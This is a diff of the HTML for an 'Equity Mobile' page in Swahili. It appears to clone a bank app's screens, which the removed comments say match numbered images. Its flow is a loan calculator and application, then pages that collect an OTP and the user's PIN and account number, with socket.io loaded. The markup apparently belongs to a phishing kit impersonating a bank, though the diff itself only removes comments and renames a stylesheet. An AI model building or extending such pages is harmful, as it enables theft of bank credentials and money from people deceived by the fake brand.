@@ -4,18 +4,15 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Equity Mobile</title>
-  <!-- Fixed leading slash ensures the browser requests the file directly from root -->
-  <link rel="stylesheet" href="/styles.css">
+  <link rel="stylesheet" href="/style.css">
   <script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
 
-  <!-- Top In-Page Surface Alert Banner -->
   <div id="surface-alert" class="surface-alert hidden"></div>
 
   <div class="app-container">
 
-    <!-- PAGE 0: WELCOME BRANDING PAGE (Matches Image 1) -->
     <div id="page-welcome" class="page active welcome-theme">
       <div class="top-nav">
         <div class="lang-selector">
@@ -43,7 +40,6 @@
       </div>
     </div>
 
-    <!-- PAGE 0.5: SIGN IN PAGE (Matches Image 6) -->
     <div id="page-signin" class="page welcome-theme">
       <div class="top-nav">
         <button class="back-btn" onclick="showPage('page-welcome')">‹</button>
@@ -88,7 +84,6 @@
       </div>
     </div>
 
-    <!-- MAIN APP HEADER (Used for Loan Calculator & 3-Step Application) -->
     <header id="main-header" class="main-header hidden">
       <button class="header-back" onclick="handleHeaderBack()">← <span id="txt-back">Rudi</span></button>
       <div class="header-brand">
@@ -100,7 +95,6 @@
       <div class="header-menu">☰</div>
     </header>
 
-    <!-- PAGE 1: LOAN CALCULATOR (Matches Image 2) -->
     <div id="page-calc" class="page light-theme">
       <div class="card calc-card">
         <h2 id="calc-title">Pata Mkopo Wako Haraka</h2>
@@ -161,7 +155,6 @@
       </div>
     </div>
 
-    <!-- APPLICATION STEP 1 OF 3 (Matches Image 3) -->
     <div id="page-step1" class="page light-theme">
       <div class="card app-card">
         <h2 class="app-heading" id="step1-title">Maombi ya Mkopo</h2>
@@ -203,7 +196,6 @@
       </div>
     </div>
 
-    <!-- APPLICATION STEP 2 OF 3 (Matches Image 4) -->
     <div id="page-step2" class="page light-theme">
       <div class="card app-card">
         <h2 class="app-heading" id="step2-title">Maombi ya Mkopo</h2>
@@ -239,7 +231,6 @@
       </div>
     </div>
 
-    <!-- APPLICATION STEP 3 OF 3 (Matches Image 5) -->
     <div id="page-step3" class="page light-theme">
       <div class="card app-card">
         <h2 class="app-heading" id="step3-title">Maombi ya Mkopo</h2>
@@ -289,7 +280,6 @@
       </div>
     </div>
 
-    <!-- PAGE 4: OTP VERIFICATION (Matches Image 7) -->
     <div id="page-otp" class="page light-theme">
       <div class="card app-card text-center">
         <h2 id="otp-title">Uthibitisho wa OTP</h2>
@@ -313,7 +303,6 @@
       </div>
     </div>
 
-    <!-- PAGE 5: PIN & ACCOUNT NUMBER PAGE (Matches Image 8) -->
     <div id="page-pin" class="page light-theme">
       <div class="card app-card text-center">
         <div class="brand-logo-small">
@@ -347,7 +336,6 @@
       </div>
     </div>
 
-    <!-- PAGE 6: FINAL SUCCESS DASHBOARD (Matches Image 9) -->
     <div id="page-approved" class="page light-theme">
       <div class="card app-card text-center">
         <div class="check-circle-icon">✓</div>
@@ -403,5 +391,4 @@
 
   <script src="/script.js"></script>
 </body>
-  </html>
-  
+</html>
